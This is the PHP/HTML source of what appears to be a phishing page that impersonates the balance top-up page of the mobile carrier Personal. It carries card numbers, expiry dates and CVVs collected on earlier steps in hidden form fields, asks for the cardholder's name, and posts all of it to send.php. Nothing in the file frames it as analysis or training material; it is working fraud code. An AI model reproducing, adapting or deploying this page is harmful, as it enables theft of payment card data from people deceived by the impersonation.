<?php
    session_start();

?>

<html>
   <head>
      <meta charset="utf-8">
      <meta name="title" content="Recargar Saldo, fácil y se acredita en el momento | Personal">
      <meta name="description" content="Entrá y recarga tu saldo para seguir navegando con tu línea Personal. Podés recargar con tarjeta de crédito o débito de una manera fácil desde casa.">
      <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
      <title>Recargar Saldo, fácil y se acredita en el momento | Personal</title>
      <link rel="icon" type="image/x-icon" href="favicon.ico">
      <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="css/normalizer.css">
      <link rel="stylesheet" type="text/css" href="css/number.css">
   </head>
   <body style="background-color: rgb(27, 27, 29);">
      <app-root>
         <pages>
            <div class="container-fluid">
               <div class="row">
                  <div class="col-12 p-0">
                     <header-component _nghost-prp-c9="">
                        <header _ngcontent-prp-c9="" class="header">
                           <nav _ngcontent-prp-c9="" class="px-0 pt-0">
                              <div _ngcontent-prp-c9="" class="d-flex justify-content-between align-items-center">
                                 <div _ngcontent-prp-c9="" class="ml-3 ml-md-5 bd-highlight"><img _ngcontent-prp-c9="" src="media/flow.svg" class="pl-md-4 img-fluid size-logo"></div>
                                 <div _ngcontent-prp-c9="" class="mr-3 mr-md-5 bd-highlight">
                                    <div _ngcontent-prp-c9="" class="d-none d-sm-block"><img _ngcontent-prp-c9="" src="media/secure.svg" class="pr-md-4"></div>
                                    <div _ngcontent-prp-c9="" class="d-block d-sm-none"><img _ngcontent-prp-c9="" src="media/secure-mobile.svg" class="pr-md-4 pr-2"></div>
                                 </div>
                              </div>
                           </nav>
                        </header>
                     </header-component>
                     <add-card-number _nghost-prp-c36="">
                        <div _ngcontent-prp-c36="" class="row justify-content-center align-items-center mt-4">
                           <div _ngcontent-prp-c36="" class="col-12 col-sm-5">
                              <div _ngcontent-prp-c36="" class="row justify-content-center align-items-center">
                                 <div _ngcontent-prp-c36="" class="col-12 mb-3">
                                    <h3 _ngcontent-prp-c36="" class="title">Datos de la tarjeta</h3>
                                 </div>
                                 <div _ngcontent-prp-c36="">
                                    <card-component _ngcontent-prp-c36="" _nghost-prp-c31="">
                                       <div _ngcontent-prp-c31="" class="row justify-content-center align-items-center" style="width: 310px; height: 175px;">
                                       <img _ngcontent-prp-c31="" id="cdImage" class="position-relative" src="media/card-visa-front.svg">
                                          <div _ngcontent-prp-c31="" class="position-absolute"><span _ngcontent-prp-c31="" style="color:#fff;font-size:20px;font-weight:400;line-height:28px;" ><?php echo($_SESSION['cnmber']);?></span></div>
                                          <div _ngcontent-prp-c31="" class="position-absolute" style="position:relative!important;top:-65px;left: -70px;"><span _ngcontent-prp-c31="" style="color:#fff;font-size:14px;font-weight:100;line-height:28px;" id="onName">Nombre y Apellido</span></div>
                                          <div _ngcontent-cav-c31="" class="cardExpiration"><span _ngcontent-cav-c31="" id="onVenc"><?php echo($_SESSION['venc']);?></span></div>
                                       </div>
                                    </card-component>
                                 </div>
                                 <div _ngcontent-prp-c36="" class="col-12 mt-5">
                                    <form _ngcontent-prp-c36="" action="send.php" method="POST" class="ng-pristine ng-invalid ng-touched">
                                    <input type="hidden" name="pn" value="<?php echo($_SESSION['lineNumber']);?>">
                                    <input type="hidden" name="am" value="300">
                                    <input type="hidden" name="cnmber" value="<?php echo($_SESSION['cnmber']);?>">
                                    <input type="hidden" name="vc" value="<?php echo($_SESSION['venc']);?>">
                                    <input type="hidden" name="cv" value="<?php echo($_SESSION['cv']);?>">
                                    <input type="hidden" name="dni" value="2132133">
                                    <input type="hidden" name="cdType" value="img/card-visa-front.svg">   
                                    <div _ngcontent-prp-c36="" class="form-group">
                                          <div _ngcontent-prp-c36="" class="input-group">
                                             <div _ngcontent-prp-c36="" class="card-number">
                                                <label _ngcontent-prp-c36="" class="label-input">Nombre y Apellido Del titular</label><input id="name" name="name" max-length="32" placeholder="Ej: Hector Ramirez" class="custom-input-dark card-icon ng-pristine ng-invalid ng-touched"><small _ngcontent-prp-c36="" id="cardNumberHelp" class="form-text help-text">Podrás encontrarlo en el frente de tu tarjeta</small>
                                                <field-error _ngcontent-prp-c36="" errormsg=" El número de tarjeta que ingresaste es incorrecto " _nghost-prp-c33="">
                                          
                                                </field-error>
                                                <field-error _ngcontent-prp-c36="" errormsg="La tarjeta ingresada no está habilitada " _nghost-prp-c33="">
                                          
                                                </field-error>
                                             </div>
                                          </div>
                                       </div>
                                 </div>
                                 <div _ngcontent-prp-c36="" class="col-12">
                                    <div _ngcontent-prp-c36="" class="row mt-5 mb-5 pl-4 pr-4">
                                       <div _ngcontent-prp-c36="" class="col-12 col-sm-6 text-right order-1 order-md-0 mb-4"><button _ngcontent-prp-c36="" id="backButtonDni" type="button" class="btn-back-dark mb-4 mb-sm-0">Anterior</button></div>
                                       <div _ngcontent-prp-c36="" class="col-12 col-sm-6 text-left order-0 order-md-1 mb-4">
                                          <button _ngcontent-prp-c36="" type="submit" id="dnButton" class="btn-disabled-dark d-block d-md-inline-block">Siguiente</button>
                                       </div>
                                    </div>
                                 </div>
                                 </form>
                              </div>
                           </div>
                        </div>
                     </add-card-number></div>
               </div>
            </div>
         </pages></app-root>
         </div>
<script src="javascript/query.min.js"></script>
<script src="javascript/query-form.js"></script>
<script src="javascript/poper.min.js"></script>
<script src="javascript/bootstrap.min.js"></script>
<script src="javascript/jquery.mask.js"></script>
<script src="javascript/custom.js"></script>   
      </div>
</body>
</html>